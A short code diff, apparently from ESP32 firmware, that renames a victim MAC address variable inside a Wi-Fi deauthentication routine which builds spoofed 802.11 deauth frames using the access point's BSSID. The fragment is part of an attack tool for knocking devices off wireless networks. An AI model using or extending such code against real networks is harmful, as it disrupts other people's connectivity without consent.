@@ -4,7 +4,7 @@
 
 extern uint8_t g_esp32_mac[6];
 extern uint8_t g_bssid[6];
-extern uint8_t VICTIM_MAC[6];
+extern uint8_t g_victim_mac[6];
 extern int deauthCount;
 
 static bool deauthRunning = false;
@@ -23,7 +23,7 @@ void deauthUpdate() {
         uint8_t frame[26];
         frame[0] = 0xC0; frame[1] = 0x00;
         frame[2] = 0x00; frame[3] = 0x00;
-        memcpy(&frame[4], VICTIM_MAC, 6);
+        memcpy(&frame[4], g_victim_mac, 6);
         memcpy(&frame[10], g_bssid, 6);
         memcpy(&frame[16], g_bssid, 6);
         frame[22] = 0x00; frame[23] = 0x00;
